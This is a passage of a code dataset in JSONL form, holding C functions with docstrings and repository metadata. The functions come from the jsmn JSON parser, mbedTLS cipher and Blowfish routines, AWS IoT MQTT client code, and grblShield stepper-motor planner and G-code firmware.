    case 't':\n        case 'f':\n        case 'n':\n#else\n            /* In non-strict mode every unquoted value is a primitive */\n            default:\n#endif\n            r = jsmn_parse_primitive(parser, js, len, tokens, num_tokens);\n            if (r < 0)\n                return r;\n            count++;\n            if (parser->toksuper != -1 && tokens != NULL)\n                tokens[parser->toksuper].size++;\n            break;\n\n#ifdef JSMN_STRICT\n            /* Unexpected char in strict mode */\n        default:\n            return JSMN_ERROR_INVAL;\n#endif\n        }\n    }\n\n    for (i = parser->toknext - 1; i >= 0; i--) {\n        /* Unmatched opened object or array */\n        if (tokens[i].start != -1 && tokens[i].end == -1) {\n            return JSMN_ERROR_PART;\n        }\n    }\n\n    return (jsmnerr_t) count;\n}", "path": "src\\aws_iot_src\\external_libs\\jsmn\\jsmn.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/*\n * Zero padding: fill with 00 ... 00\n */\n", "func_signal": "static void add_zeros_padding( unsigned char *output,\n                               size_t output_len, size_t data_len )", "code": "{\n    size_t i;\n\n    for( i = data_len; i < output_len; i++ )\n        output[i] = 0x00;\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\library\\cipher.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/**\n * Allocates a fresh unused token from the token pull.\n */\n", "func_signal": "static jsmntok_t *jsmn_alloc_token(jsmn_parser *parser, jsmntok_t *tokens,\n        size_t num_tokens)", "code": "{\n    jsmntok_t *tok;\n    if (parser->toknext >= num_tokens) {\n        return NULL;\n    }\n    tok = &tokens[parser->toknext++];\n    tok->start = tok->end = -1;\n    tok->size = 0;\n#ifdef JSMN_PARENT_LINKS\n    tok->parent = -1;\n#endif\n    return tok;\n}", "path": "src\\aws_iot_src\\external_libs\\jsmn\\jsmn.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/*\n * PKCS7 (and PKCS5) padding: fill with ll bytes, with ll = padding_len\n */\n", "func_signal": "static void add_pkcs_padding( unsigned char *output, size_t output_len,\n        size_t data_len )", "code": "{\n    size_t padding_len = output_len - data_len;\n    unsigned char i;\n\n    for( i = 0; i < padding_len; i++ )\n        output[data_len + i] = (unsigned char) padding_len;\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\library\\cipher.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/**\n * Fills token type and boundaries.\n */\n", "func_signal": "static void jsmn_fill_token(jsmntok_t *token, jsmntype_t type, int start,\n        int end)", "code": "{\n    token->type = type;\n    token->start = start;\n    token->end = end;\n    token->size = 0;\n}", "path": "src\\aws_iot_src\\external_libs\\jsmn\\jsmn.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/*\n * Test recv/send functions that make sure each try returns\n * WANT_READ/WANT_WRITE at least once before sucesseding\n */\n", "func_signal": "static int my_recv( void *ctx, unsigned char *buf, size_t len )", "code": "{\n    static int first_try = 1;\n    int ret;\n\n    if( first_try )\n    {\n        first_try = 0;\n        return( MBEDTLS_ERR_SSL_WANT_READ );\n    }\n\n    ret = mbedtls_net_recv( ctx, buf, len );\n    if( ret != MBEDTLS_ERR_SSL_WANT_READ )\n        first_try = 1; /* Next call will be a new operation */\n    return( ret );\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\programs\\ssl\\ssl_client2.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/*\n * Enabled if debug_level > 1 in code below\n */\n", "func_signal": "static int my_verify( void *data, mbedtls_x509_crt *crt, int depth, uint32_t *flags )", "code": "{\n    char buf[1024];\n    ((void) data);\n\n    mbedtls_printf( \"\\nVerify requested for (Depth %d):\\n\", depth );\n    mbedtls_x509_crt_info( buf, sizeof( buf ) - 1, \"\", crt );\n    mbedtls_printf( \"%s\", buf );\n\n    if ( ( *flags ) == 0 )\n        mbedtls_printf( \"  This certificate has no flags\\n\" );\n    else\n    {\n        mbedtls_x509_crt_verify_info( buf, sizeof( buf ), \"  ! \", *flags );\n        mbedtls_printf( \"%s\\n\", buf );\n    }\n\n    return( 0 );\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\programs\\ssl\\ssl_client2.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/*\n * Set functions pointers and initialize global mutexes\n */\n", "func_signal": "void mbedtls_threading_set_alt( void (*mutex_init)( mbedtls_threading_mutex_t * ),\n                       void (*mutex_free)( mbedtls_threading_mutex_t * ),\n                       int (*mutex_lock)( mbedtls_threading_mutex_t * ),\n                       int (*mutex_unlock)( mbedtls_threading_mutex_t * ) )", "code": "{\n    mbedtls_mutex_init = mutex_init;\n    mbedtls_mutex_free = mutex_free;\n    mbedtls_mutex_lock = mutex_lock;\n    mbedtls_mutex_unlock = mutex_unlock;\n\n    mbedtls_mutex_init( &mbedtls_threading_readdir_mutex );\n    mbedtls_mutex_init( &mbedtls_threading_gmtime_mutex );\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\library\\threading.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/*\n * Blowfish key schedule\n */\n", "func_signal": "int mbedtls_blowfish_setkey( mbedtls_blowfish_context *ctx, const unsigned char *key,\n                     unsigned int keybits )", "code": "{\n    unsigned int i, j, k;\n    uint32_t data, datal, datar;\n\n    if( keybits < MBEDTLS_BLOWFISH_MIN_KEY_BITS || keybits > MBEDTLS_BLOWFISH_MAX_KEY_BITS ||\n        ( keybits % 8 ) )\n    {\n        return( MBEDTLS_ERR_BLOWFISH_INVALID_KEY_LENGTH );\n    }\n\n    keybits >>= 3;\n\n    for( i = 0; i < 4; i++ )\n    {\n        for( j = 0; j < 256; j++ )\n            ctx->S[i][j] = S[i][j];\n    }\n\n    j = 0;\n    for( i = 0; i < MBEDTLS_BLOWFISH_ROUNDS + 2; ++i )\n    {\n        data = 0x00000000;\n        for( k = 0; k < 4; ++k )\n        {\n            data = ( data << 8 ) | key[j++];\n            if( j >= keybits )\n                j = 0;\n        }\n        ctx->P[i] = P[i] ^ data;\n    }\n\n    datal = 0x00000000;\n    datar = 0x00000000;\n\n    for( i = 0; i < MBEDTLS_BLOWFISH_ROUNDS + 2; i += 2 )\n    {\n        blowfish_enc( ctx, &datal, &datar );\n        ctx->P[i] = datal;\n        ctx->P[i + 1] = datar;\n    }\n\n    for( i = 0; i < 4; i++ )\n    {\n       for( j = 0; j < 256; j += 2 )\n       {\n            blowfish_enc( ctx, &datal, &datar );\n            ctx->S[i][j] = datal;\n            ctx->S[i][j + 1] = datar;\n        }\n    }\n    return( 0 );\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\library\\blowfish.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/*\n * Packet-oriented encryption for AEAD modes\n */\n", "func_signal": "int mbedtls_cipher_auth_encrypt( mbedtls_cipher_context_t *ctx,\n                         const unsigned char *iv, size_t iv_len,\n                         const unsigned char *ad, size_t ad_len,\n                         const unsigned char *input, size_t ilen,\n                         unsigned char *output, size_t *olen,\n                         unsigned char *tag, size_t tag_len )", "code": "{\n#if defined(MBEDTLS_GCM_C)\n    if( MBEDTLS_MODE_GCM == ctx->cipher_info->mode )\n    {\n        *olen = ilen;\n        return( mbedtls_gcm_crypt_and_tag( ctx->cipher_ctx, MBEDTLS_GCM_ENCRYPT, ilen,\n                                   iv, iv_len, ad, ad_len, input, output,\n                                   tag_len, tag ) );\n    }\n#endif /* MBEDTLS_GCM_C */\n#if defined(MBEDTLS_CCM_C)\n    if( MBEDTLS_MODE_CCM == ctx->cipher_info->mode )\n    {\n        *olen = ilen;\n        return( mbedtls_ccm_encrypt_and_tag( ctx->cipher_ctx, ilen,\n                                     iv, iv_len, ad, ad_len, input, output,\n                                     tag, tag_len ) );\n    }\n#endif /* MBEDTLS_CCM_C */\n\n    return( MBEDTLS_ERR_CIPHER_FEATURE_UNAVAILABLE );\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\library\\cipher.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/* MBEDTLS_GCM_C */\n", "func_signal": "int mbedtls_cipher_update( mbedtls_cipher_context_t *ctx, const unsigned char *input,\n                   size_t ilen, unsigned char *output, size_t *olen )", "code": "{\n    int ret;\n\n    if( NULL == ctx || NULL == ctx->cipher_info || NULL == olen )\n    {\n        return( MBEDTLS_ERR_CIPHER_BAD_INPUT_DATA );\n    }\n\n    *olen = 0;\n\n    if( ctx->cipher_info->mode == MBEDTLS_MODE_ECB )\n    {\n        if( ilen != mbedtls_cipher_get_block_size( ctx ) )\n            return( MBEDTLS_ERR_CIPHER_FULL_BLOCK_EXPECTED );\n\n        *olen = ilen;\n\n        if( 0 != ( ret = ctx->cipher_info->base->ecb_func( ctx->cipher_ctx,\n                    ctx->operation, input, output ) ) )\n        {\n            return( ret );\n        }\n\n        return( 0 );\n    }\n\n#if defined(MBEDTLS_GCM_C)\n    if( ctx->cipher_info->mode == MBEDTLS_MODE_GCM )\n    {\n        *olen = ilen;\n        return mbedtls_gcm_update( (mbedtls_gcm_context *) ctx->cipher_ctx, ilen, input,\n                           output );\n    }\n#endif\n\n    if( input == output &&\n       ( ctx->unprocessed_len != 0 || ilen % mbedtls_cipher_get_block_size( ctx ) ) )\n    {\n        return( MBEDTLS_ERR_CIPHER_BAD_INPUT_DATA );\n    }\n\n#if defined(MBEDTLS_CIPHER_MODE_CBC)\n    if( ctx->cipher_info->mode == MBEDTLS_MODE_CBC )\n    {\n        size_t copy_len = 0;\n\n        /*\n         * If there is not enough data for a full block, cache it.\n         */\n        if( ( ctx->operation == MBEDTLS_DECRYPT &&\n                ilen + ctx->unprocessed_len <= mbedtls_cipher_get_block_size( ctx ) ) ||\n             ( ctx->operation == MBEDTLS_ENCRYPT &&\n                ilen + ctx->unprocessed_len < mbedtls_cipher_get_block_size( ctx ) ) )\n        {\n            memcpy( &( ctx->unprocessed_data[ctx->unprocessed_len] ), input,\n                    ilen );\n\n            ctx->unprocessed_len += ilen;\n            return( 0 );\n        }\n\n        /*\n         * Process cached data first\n         */\n        if( ctx->unprocessed_len != 0 )\n        {\n            copy_len = mbedtls_cipher_get_block_size( ctx ) - ctx->unprocessed_len;\n\n            memcpy( &( ctx->unprocessed_data[ctx->unprocessed_len] ), input,\n                    copy_len );\n\n            if( 0 != ( ret = ctx->cipher_info->base->cbc_func( ctx->cipher_ctx,\n                    ctx->operation, mbedtls_cipher_get_block_size( ctx ), ctx->iv,\n                    ctx->unprocessed_data, output ) ) )\n            {\n                return( ret );\n            }\n\n            *olen += mbedtls_cipher_get_block_size( ctx );\n            output += mbedtls_cipher_get_block_size( ctx );\n            ctx->unprocessed_len = 0;\n\n            input += copy_len;\n            ilen -= copy_len;\n        }\n\n        /*\n         * Cache final, incomplete block\n         */\n        if( 0 != ilen )\n        {\n            copy_len = ilen % mbedtls_cipher_get_block_size( ctx );\n            if( copy_len == 0 && ctx->operation == MBEDTLS_DECRYPT )\n                copy_len = mbedtls_cipher_get_block_size( ctx );\n\n            memcpy( ctx->unprocessed_data, &( input[ilen - copy_len] ),\n                    copy_len );\n\n            ctx->unprocessed_len += copy_len;\n            ilen -= copy_len;\n        }\n\n        /*\n         * Process remaining full blocks\n         */\n        if( ilen )\n        {\n            if( 0 != ( ret = ctx->cipher_info->base->cbc_func( ctx->cipher_ctx,\n                    ctx->operation, ilen, ctx->iv, input, output ) ) )\n            {\n                return( ret );\n            }\n\n            *olen += ilen;\n        }\n\n        return( 0 );\n    }\n#endif /* MBEDTLS_CIPHER_MODE_CBC */\n\n#if defined(MBEDTLS_CIPHER_MODE_CFB)\n    if( ctx->cipher_info->mode == MBEDTLS_MODE_CFB )\n    {\n        if( 0 != ( ret = ctx->cipher_info->base->cfb_func( ctx->cipher_ctx,\n                ctx->operation, ilen, &ctx->unprocessed_len, ctx->iv,\n                input, output ) ) )\n        {\n            return( ret );\n        }\n\n        *olen = ilen;\n\n        return( 0 );\n    }\n#endif /* MBEDTLS_CIPHER_MODE_CFB */\n\n#if defined(MBEDTLS_CIPHER_MODE_CTR)\n    if( ctx->cipher_info->mode == MBEDTLS_MODE_CTR )\n    {\n        if( 0 != ( ret = ctx->cipher_info->base->ctr_func( ctx->cipher_ctx,\n                ilen, &ctx->unprocessed_len, ctx->iv,\n                ctx->unprocessed_data, input, output ) ) )\n        {\n            return( ret );\n        }\n\n        *olen = ilen;\n\n        return( 0 );\n    }\n#endif /* MBEDTLS_CIPHER_MODE_CTR */\n\n#if defined(MBEDTLS_CIPHER_MODE_STREAM)\n    if( ctx->cipher_info->mode == MBEDTLS_MODE_STREAM )\n    {\n        if( 0 != ( ret = ctx->cipher_info->base->stream_func( ctx->cipher_ctx,\n                                                    ilen, input, output ) ) )\n        {\n            return( ret );\n        }\n\n        *olen = ilen;\n\n        return( 0 );\n    }\n#endif /* MBEDTLS_CIPHER_MODE_STREAM */\n\n    return( MBEDTLS_ERR_CIPHER_FEATURE_UNAVAILABLE );\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\library\\cipher.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/*\n * One and zeros padding: fill with 80 00 ... 00\n */\n", "func_signal": "static void add_one_and_zeros_padding( unsigned char *output,\n                                       size_t output_len, size_t data_len )", "code": "{\n    size_t padding_len = output_len - data_len;\n    unsigned char i = 0;\n\n    output[data_len] = 0x80;\n    for( i = 1; i < padding_len; i++ )\n        output[data_len + i] = 0x00;\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\library\\cipher.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/**\n * Filsl next token with JSON string.\n */\n", "func_signal": "static jsmnerr_t jsmn_parse_string(jsmn_parser *parser, const char *js,\n        size_t len, jsmntok_t *tokens, size_t num_tokens)", "code": "{\n    jsmntok_t *token;\n\n    int start = parser->pos;\n\n    parser->pos++;\n\n    /* Skip starting quote */\n    for (; parser->pos < len && js[parser->pos] != '\\0'; parser->pos++) {\n        char c = js[parser->pos];\n\n        /* Quote: end of string */\n        if (c == '\\\"') {\n            if (tokens == NULL) {\n                return (jsmnerr_t) 0;\n            }\n            token = jsmn_alloc_token(parser, tokens, num_tokens);\n            if (token == NULL) {\n                parser->pos = start;\n                return JSMN_ERROR_NOMEM;\n            }\n            jsmn_fill_token(token, JSMN_STRING, start + 1, parser->pos);\n#ifdef JSMN_PARENT_LINKS\n            token->parent = parser->toksuper;\n#endif\n            return (jsmnerr_t) 0;\n        }\n\n        /* Backslash: Quoted symbol expected */\n        if (c == '\\\\') {\n            parser->pos++;\n            switch (js[parser->pos]) {\n            /* Allowed escaped symbols */\n            case '\\\"':\n            case '/':\n            case '\\\\':\n            case 'b':\n            case 'f':\n            case 'r':\n            case 'n':\n            case 't':\n                break;\n                /* Allows escaped symbol \\uXXXX */\n            case 'u':\n                parser->pos++;\n                int i;\n                for (i = 0; i < 4 && js[parser->pos] != '\\0'; i++) {\n                    /* If it isn't a hex character we have an error */\n                    if (!((js[parser->pos] >= 48 && js[parser->pos] <= 57) || /* 0-9 */\n                    (js[parser->pos] >= 65 && js[parser->pos] <= 70) || /* A-F */\n                    (js[parser->pos] >= 97 && js[parser->pos] <= 102))) { /* a-f */\n                        parser->pos = start;\n                        return JSMN_ERROR_INVAL;\n                    }\n                    parser->pos++;\n                }\n                parser->pos--;\n                break;\n                /* Unexpected symbol */\n            default:\n                parser->pos = start;\n                return JSMN_ERROR_INVAL;\n            }\n        }\n    }\n    parser->pos = start;\n    return JSMN_ERROR_PART;\n}", "path": "src\\aws_iot_src\\external_libs\\jsmn\\jsmn.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/*\n * Blowfish CFB buffer encryption/decryption\n */\n", "func_signal": "int mbedtls_blowfish_crypt_cfb64( mbedtls_blowfish_context *ctx,\n                       int mode,\n                       size_t length,\n                       size_t *iv_off,\n                       unsigned char iv[MBEDTLS_BLOWFISH_BLOCKSIZE],\n                       const unsigned char *input,\n                       unsigned char *output )", "code": "{\n    int c;\n    size_t n = *iv_off;\n\n    if( mode == MBEDTLS_BLOWFISH_DECRYPT )\n    {\n        while( length-- )\n        {\n            if( n == 0 )\n                mbedtls_blowfish_crypt_ecb( ctx, MBEDTLS_BLOWFISH_ENCRYPT, iv, iv );\n\n            c = *input++;\n            *output++ = (unsigned char)( c ^ iv[n] );\n            iv[n] = (unsigned char) c;\n\n            n = ( n + 1 ) % MBEDTLS_BLOWFISH_BLOCKSIZE;\n        }\n    }\n    else\n    {\n        while( length-- )\n        {\n            if( n == 0 )\n                mbedtls_blowfish_crypt_ecb( ctx, MBEDTLS_BLOWFISH_ENCRYPT, iv, iv );\n\n            iv[n] = *output++ = (unsigned char)( iv[n] ^ *input++ );\n\n            n = ( n + 1 ) % MBEDTLS_BLOWFISH_BLOCKSIZE;\n        }\n    }\n\n    *iv_off = n;\n\n    return( 0 );\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\library\\blowfish.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/**\n * @brief Unsubscribe to an MQTT topic.\n *\n * Called to send an unsubscribe message to the broker requesting removal of a subscription\n * to an MQTT topic.\n * @note Call is blocking.  The call returns after the receipt of the UNSUBACK control packet.\n * This is the internal function which is called by the unsubscribe API to perform the operation.\n * Not meant to be called directly as it doesn't do validations or client state changes\n *\n * @param pClient Reference to the IoT Client\n * @param pTopicName Topic Name to publish to\n * @param topicNameLen Length of the topic name\n *\n * @return An IoT Error Type defining successful/failed unsubscribe call\n */\n", "func_signal": "static IoT_Error_t _aws_iot_mqtt_internal_unsubscribe(AWS_IoT_Client *pClient, const char *pTopicFilter, uint16_t topicFilterLen)", "code": "{\n\t/* No NULL checks because this is a static internal function */\n\n\tTimer timer;\n\n\tuint32_t serializedLen = 0;\n\tuint32_t i = 0;\n\tIoT_Error_t rc;\n\n\tFUNC_ENTRY;\n\n\tinit_timer(&timer);\n\tcountdown_ms(&timer, pClient->clientData.commandTimeoutMs);\n\n\trc = _aws_iot_mqtt_serialize_unsubscribe(pClient->clientData.writeBuf, pClient->clientData.writeBufSize, 0,\n\t\t\t\t\t\t\t\t\t\t\t aws_iot_mqtt_get_next_packet_id(pClient), 1, &pTopicFilter,\n\t\t\t\t\t\t\t\t\t\t\t &topicFilterLen, &serializedLen);\n\tif(SUCCESS != rc) {\n\t\tFUNC_EXIT_RC(rc);\n\t}\n\n\t/* send the unsubscribe packet */\n\trc = aws_iot_mqtt_internal_send_packet(pClient, serializedLen, &timer);\n\tif(SUCCESS != rc) {\n\t\tFUNC_EXIT_RC(rc);\n\t}\n\n\trc = aws_iot_mqtt_internal_wait_for_read(pClient, UNSUBACK, &timer);\n\tif(SUCCESS != rc) {\n\t\tFUNC_EXIT_RC(rc);\n\t}\n\n\tuint16_t packet_id;\n\trc = _aws_iot_mqtt_deserialize_unsuback(&packet_id, pClient->clientData.readBuf, pClient->clientData.readBufSize);\n\tif(SUCCESS != rc) {\n\t\tFUNC_EXIT_RC(rc);\n\t}\n\n\t/* Remove from message handler array */\n\tfor(i = 0; i < AWS_IOT_MQTT_NUM_SUBSCRIBE_HANDLERS; ++i) {\n\t\tif(pClient->clientData.messageHandlers[i].topicName != NULL &&\n\t\t   (strcmp(pClient->clientData.messageHandlers[i].topicName, pTopicFilter) == 0)) {\n\t\t\tpClient->clientData.messageHandlers[i].topicName = NULL;\n\t\t\t/* We don't want to break here, in case the same topic is registered\n             * with 2 callbacks. Unlikely scenario */\n\t\t}\n\t}\n\n\tFUNC_EXIT_RC(SUCCESS);\n}", "path": "src\\aws_iot_src\\src\\aws_iot_mqtt_client_unsubscribe.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/*\n * Packet-oriented wrapper for non-AEAD modes\n */\n", "func_signal": "int mbedtls_cipher_crypt( mbedtls_cipher_context_t *ctx,\n                  const unsigned char *iv, size_t iv_len,\n                  const unsigned char *input, size_t ilen,\n                  unsigned char *output, size_t *olen )", "code": "{\n    int ret;\n    size_t finish_olen;\n\n    if( ( ret = mbedtls_cipher_set_iv( ctx, iv, iv_len ) ) != 0 )\n        return( ret );\n\n    if( ( ret = mbedtls_cipher_reset( ctx ) ) != 0 )\n        return( ret );\n\n    if( ( ret = mbedtls_cipher_update( ctx, input, ilen, output, olen ) ) != 0 )\n        return( ret );\n\n    if( ( ret = mbedtls_cipher_finish( ctx, output + *olen, &finish_olen ) ) != 0 )\n        return( ret );\n\n    *olen += finish_olen;\n\n    return( 0 );\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\library\\cipher.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/*\n * Free global mutexes\n */\n", "func_signal": "void mbedtls_threading_free_alt( void )", "code": "{\n    mbedtls_mutex_free( &mbedtls_threading_readdir_mutex );\n    mbedtls_mutex_free( &mbedtls_threading_gmtime_mutex );\n}", "path": "src\\aws_iot_src\\external_libs\\mbedTLS\\library\\threading.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "/**\n  * Deserializes the supplied (wire) buffer into unsuback data\n  * @param pPacketId returned integer - the MQTT packet identifier\n  * @param pRxBuf the raw buffer data, of the correct length determined by the remaining length field\n  * @param rxBufLen the length in bytes of the data in the supplied buffer\n  * @return IoT_Error_t indicating function execution status\n  */\n", "func_signal": "static IoT_Error_t _aws_iot_mqtt_deserialize_unsuback(uint16_t *pPacketId, unsigned char *pRxBuf, size_t rxBufLen)", "code": "{\n\tunsigned char type = 0;\n\tunsigned char dup = 0;\n\tIoT_Error_t rc;\n\n\tFUNC_ENTRY;\n\n\trc = aws_iot_mqtt_internal_deserialize_ack(&type, &dup, pPacketId, pRxBuf, rxBufLen);\n\tif(SUCCESS == rc && UNSUBACK != type) {\n\t\trc = FAILURE;\n\t}\n\n\tFUNC_EXIT_RC(rc);\n}", "path": "src\\aws_iot_src\\src\\aws_iot_mqtt_client_unsubscribe.c", "repo_name": "jeremyhahn/ecutools", "stars": 191, "license": "gpl-3.0", "language": "c", "size": 17547}
{"docstring": "// Initializes the trapezoid generator from the current block. Called whenever a new \n// block begins.\n", "func_signal": "static void trapezoid_generator_reset()", "code": "{\n  trapezoid_adjusted_rate = current_block->initial_rate;  \n  trapezoid_tick_cycle_counter = 0; // Always start a new trapezoid with a full acceleration tick\n  set_step_events_per_minute(trapezoid_adjusted_rate);\n}", "path": "firmware\\stepper.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// This function gives you the point at which you must start braking (at the rate of -acceleration) if \n// you started at speed initial_rate and accelerated until this point and want to end at the final_rate after\n// a total travel of distance. This can be used to compute the intersection point between acceleration and\n// deceleration in the cases where the trapezoid has no plateau (i.e. never reaches maximum speed)\n", "func_signal": "static double intersection_distance(double initial_rate, double final_rate, double acceleration, double distance)", "code": "{\n  return(\n    (2*acceleration*distance-initial_rate*initial_rate+final_rate*final_rate)/\n    (4*acceleration)\n  );\n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Configures the prescaler and ceiling of timer 1 to produce the given rate as accurately as possible.\n// Returns the actual number of cycles per interrupt\n", "func_signal": "static uint32_t config_step_timer(uint32_t cycles)", "code": "{\n  uint16_t ceiling;\n  uint16_t prescaler;\n  uint32_t actual_cycles;\n\tif (cycles <= 0xffffL) {\n\t\tceiling = cycles;\n    prescaler = 0; // prescaler: 0\n    actual_cycles = ceiling;\n\t} else if (cycles <= 0x7ffffL) {\n    ceiling = cycles >> 3;\n    prescaler = 1; // prescaler: 8\n    actual_cycles = ceiling * 8L;\n\t} else if (cycles <= 0x3fffffL) {\n\t\tceiling =  cycles >> 6;\n    prescaler = 2; // prescaler: 64\n    actual_cycles = ceiling * 64L;\n\t} else if (cycles <= 0xffffffL) {\n\t\tceiling =  (cycles >> 8);\n    prescaler = 3; // prescaler: 256\n    actual_cycles = ceiling * 256L;\n\t} else if (cycles <= 0x3ffffffL) {\n\t\tceiling = (cycles >> 10);\n    prescaler = 4; // prescaler: 1024\n    actual_cycles = ceiling * 1024L;    \n\t} else {\n\t  // Okay, that was slower than we actually go. Just set the slowest speed\n\t\tceiling = 0xffff;\n    prescaler = 4;\n    actual_cycles = 0xffff * 1024;\n\t}\n\t// Set prescaler\n  TCCR1B = (TCCR1B & ~(0x07<<CS10)) | ((prescaler+1)<<CS10);\n  // Set ceiling\n  OCR1A = ceiling;\n  return(actual_cycles);\n}", "path": "firmware\\stepper.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// The kernel called by planner_recalculate() when scanning the plan from last to first entry.\n", "func_signal": "static void planner_reverse_pass_kernel(block_t *previous, block_t *current, block_t *next)", "code": "{\n  if(!current) { return; }\n\n  double entry_factor = 1.0;\n  double exit_factor;\n  if (next) {\n    exit_factor = next->entry_factor;\n  } else {\n    exit_factor = factor_for_safe_speed(current);\n  }\n  \n  // Calculate the entry_factor for the current block. \n  if (previous) {\n    // Reduce speed so that junction_jerk is within the maximum allowed\n    double jerk = junction_jerk(previous, current);\n    if (jerk > settings.max_jerk) {\n      entry_factor = (settings.max_jerk/jerk);\n    } \n    // If the required deceleration across the block is too rapid, reduce the entry_factor accordingly.\n    if (entry_factor > exit_factor) {\n      double max_entry_speed = max_allowable_speed(-settings.acceleration,current->nominal_speed*exit_factor, \n        current->millimeters);\n      double max_entry_factor = max_entry_speed/current->nominal_speed;\n      if (max_entry_factor < entry_factor) {\n        entry_factor = max_entry_factor;\n      }\n    }    \n  } else {\n    entry_factor = factor_for_safe_speed(current);\n  }\n    \n  // Store result\n  current->entry_factor = entry_factor;\n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// \"Junction jerk\" in this context is the immediate change in speed at the junction of two blocks.\n// This method will calculate the junction jerk as the euclidean distance between the nominal \n// velocities of the respective blocks.\n", "func_signal": "static double junction_jerk(block_t *before, block_t *after)", "code": "{\n  return(sqrt(\n    pow(before->speed_x-after->speed_x, 2)+\n    pow(before->speed_y-after->speed_y, 2)+\n    pow(before->speed_z-after->speed_z, 2))\n  );\n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Recalculates the trapezoid speed profiles for all blocks in the plan according to the \n// entry_factor for each junction. Must be called by planner_recalculate() after \n// updating the blocks.\n", "func_signal": "static void planner_recalculate_trapezoids()", "code": "{\n  int8_t block_index = block_buffer_tail;\n  block_t *current;\n  block_t *next = NULL;\n  \n  while(block_index != block_buffer_head) {\n    current = next;\n    next = &block_buffer[block_index];\n    if (current) {\n      calculate_trapezoid_for_block(current, current->entry_factor, next->entry_factor);      \n    }\n    block_index = (block_index+1) % BLOCK_BUFFER_SIZE;\n  }\n  calculate_trapezoid_for_block(next, next->entry_factor, factor_for_safe_speed(next));\n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Calculates the distance (not time) it takes to accelerate from initial_rate to target_rate using the \n// given acceleration:\n", "func_signal": "static double estimate_acceleration_distance(double initial_rate, double target_rate, double acceleration)", "code": "{\n  return(\n    (target_rate*target_rate-initial_rate*initial_rate)/\n    (2L*acceleration)\n  );\n}", "path": "firmware\\planner.c", "repo_name": "synthetos/grblShield", "stars": 130, "license": "None", "language": "c", "size": 3760}
{"docstring": "// Executes one line of 0-terminated G-Code. The line is assumed to contain only uppercase\n// characters and signed floating point values (no whitespace).\n", "func_signal": "uint8_t gc_execute_line(char *line)", "code": "{\n  uint8_t char_counter = 0;  \n  char letter;\n  double value;\n  double unit_converted_value;\n  double inverse_feed_rate = -1; // negative inverse_feed_rate means no inverse_feed_rate specified\n  int radius_mode = false;\n  \n  uint8_t absolute_override = false;          /* 1 = absolute motion for this block only {G53} */\n  uint8_t next_action = NEXT_ACTION_DEFAULT;  /* The action that will be taken by the parsed line */\n  \n  double target[3], offset[3];  \n  \n  double p = 0, r = 0;\n  int int_value;\n  \n  clear_vector(target);\n  clear_vector(offset);\n\n  gc.status_code = STATUS_OK;\n  \n  // Disregard comments and block delete\n  if (line[0] == '(') { return(gc.status_code); }\n  if (line[0] == '/') { char_counter++; } // ignore block delete  \n  \n  // Pass 1: Commands\n  while(next_statement(&letter, &value, line, &char_counter)) {\n    int_value = trunc(value);\n    switch(letter) {\n      case 'G':\n      switch(int_value) {\n        case 0: gc.motion_mode = MOTION_MODE_SEEK; break;\n        case 1: gc.motion_mode = MOTION_MODE_LINEAR; break;\n#ifdef __AVR_ATmega328P__        \n        case 2: gc.motion_mode = MOTION_MODE_CW_ARC; break;\n        case 3: gc.motion_mode = 